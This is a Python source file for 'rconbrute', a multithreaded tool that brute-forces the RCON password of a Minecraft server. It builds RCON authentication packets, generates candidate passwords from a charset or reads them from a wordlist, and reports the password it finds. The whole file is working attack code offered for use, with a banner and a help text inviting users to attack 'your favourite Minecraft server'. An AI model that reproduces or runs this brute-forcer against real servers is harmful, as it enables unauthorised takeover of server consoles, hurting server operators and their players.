import argparse, itertools, socket, time, threading, signal, math, random

name = """
 ██▓███  ▓█████  ███▄    █  ██▓  ██████
▓██░  ██▒▓█   ▀  ██ ▀█   █ ▓██▒▒██    ▒
▓██░ ██▓▒▒███   ▓██  ▀█ ██▒▒██▒░ ▓██▄
▒██▄█▓▒ ▒▒▓█  ▄ ▓██▒  ▐▌██▒░██░  ▒   ██▒
▒██▒ ░  ░░▒████▒▒██░   ▓██░░██░▒██████▒▒
▒▓▒░ ░  ░░░ ▒░ ░░ ▒░   ▒ ▒ ░▓  ▒ ▒▓▒ ▒ ░
░▒ ░      ░ ░  ░░ ░░   ░ ▒░ ▒ ░░ ░▒  ░ ░
░░          ░      ░   ░ ░  ▒ ░░  ░  ░
            ░  ░         ░  ░        ░
"""

class AtomicFlag:
    def __init__(self):
        self.value = True
        self._lock = threading.Lock()

    def get(self):
        with self._lock:
            return self.value

    def set(self):
        with self._lock:
            self.value = False

counter = 0
is_running = AtomicFlag()
found = None

def print_help_and_quit(argparser):
	argparser.print_help()
	raise SystemExit

def int_to_le(value):
	return value.to_bytes(4, 'little')

def le_to_int(value):
	return int.from_bytes(value, "little")

def make_payload(password, id):
	payload = int_to_le(id)
	payload += int_to_le(3)
	payload += password.encode('ascii')
	payload += b'\x00\x00'
	payload = int_to_le(len(payload)) + payload
	return payload

def bruteforce(host, port, _passwords):
	global counter
	global is_running
	global found
	
	for pwd in _passwords:
		try:
			counter += 1
			if not is_running.get():
				break
			
			id = random.randint(0, 59595995)
			payload = make_payload(pwd, id)
			
			con = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			con.settimeout(1)
			con.connect((host, port))
			con.sendall(payload)
			
			if le_to_int(con.recv(1024)[4:8]) == id:
				found = pwd
				is_running.set()
				break
			
			con.close()
		except Exception:
			pass

def ___quit():
	is_running.set()
	try:
		for thr in threads_list:
			thr.join()
	except KeyboardInterrupt:
		pass
	raise SystemExit

if __name__ == '__main__':
	parser = argparse.ArgumentParser(
					prog='rconbrute',
					description='Bruteforce your favourite Minecraft server\'s RCON with this tool!',
					epilog='made by antihack3r')
	parser.add_argument('-H', '--host', default='localhost', help='Address of the RCON server (default is 0.0.0.0)')
	parser.add_argument('-p', '--port', default=25575, type=int, help='Port of the RCON server (default is 25575)')
	parser.add_argument('-t', '--threads', default=5, type=int, help='Number of bruteforcing threads (default is 5)')
	parser.add_argument('-c', '--charset', default='1234567890', help='Charset to be used for generating passwords (default is 0-9)')
	parser.add_argument('-l', '--password-len', default=6, type=int, help='Password length to be used for generating passwords (default is 6)')
	parser.add_argument('--passwords', type=argparse.FileType('r'), help='File containing passwords to be used')
	parser.add_argument('-v', '--verbose', action='store_true', help='Do more output')
	
	parsed = vars(parser.parse_args())
	
	host = parsed['host']
	port = parsed['port']
	threads = parsed['threads']
	charset = parsed['charset']
	password_len = parsed['password_len']
	passwords = parsed['passwords']
	verbose = parsed['verbose']
	
	use_file = passwords != None
	pwd_list = []
	pwds = None
	
	if use_file:
		pwd_list = [line.rstrip() for line in passwords]
		passwords.close()
		pwds = len(pwd_list)
	else:
		pwds = len(charset) ** password_len
	
	print(name)
	
	if use_file:
		if verbose:
			print('[v] Using ' + passwords.name + ' as a password list')
		
		if len(pwd_list) == 0:
			raise AssertionError('[-] Password list empty!')
			
		print('[*] Read {} passwords'.format(pwds))
	elif verbose:
		print('[v] Using ' + charset + ' as a charset')
	
	if not use_file:
		print('[*] Will use {} {}-character passwords'.format(pwds, password_len))
		pwd_list = [''.join(pwd) for pwd in itertools.product(charset, repeat = password_len)]
	
	print('[*] Checking if the RCON server is alive...')
	try:
		con = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		con.settimeout(1)
		con.connect((host, port))
		con.close()
	except Exception:
		prompt = input('[-] The server is DEAD. Continue anyway? (y/N)> ')
		if prompt == '' or 'n' in prompt or 'N' in prompt:
			raise SystemExit
	else:
		print('[+] Server is alive.')
	
	last_verbose = time.time()
	threads_list = []
	
	total_pwds_by_thread = math.floor(pwds / threads)
	for i in range(threads):
		sublist = None
		rem = pwds % threads
		
		if rem != 0 and i == 0:
			sublist = pwd_list[:total_pwds_by_thread + rem]
			del pwd_list[:total_pwds_by_thread + rem]
		else:
			sublist = pwd_list[:total_pwds_by_thread]
			del pwd_list[:total_pwds_by_thread]
		
		threads_list.append(threading.Thread(target = bruteforce, args = (host, port, sublist[:])))
	
	for thr in threads_list:
		thr.start()
	
	try:
		while is_running.get():
			threads_list = [thr for thr in threads_list if thr.is_alive()]
			if len(threads_list) == 0:
				is_running.set()
		
			if verbose and time.time() - last_verbose >= 1:
				last_verbose = time.time()
				print('[v] Tested {} passwords ({}%)'.format(counter, round((counter / pwds) * 100)))
	except KeyboardInterrupt:
		print('[*] KeyboardInterrupt! Tested {} passwords ({}%).'.format(counter, round((counter / pwds) * 100)))
		___quit()
	
	if not is_running.get():
		if found != None:
			print('[+] PASSWORD FOUND! > {} < [+]'.format(found))
		else:
			print('[-] Password NOT FOUND! Tested {} passwords ({}%).'.format(counter, round((counter / pwds) * 100)))
		
		___quit()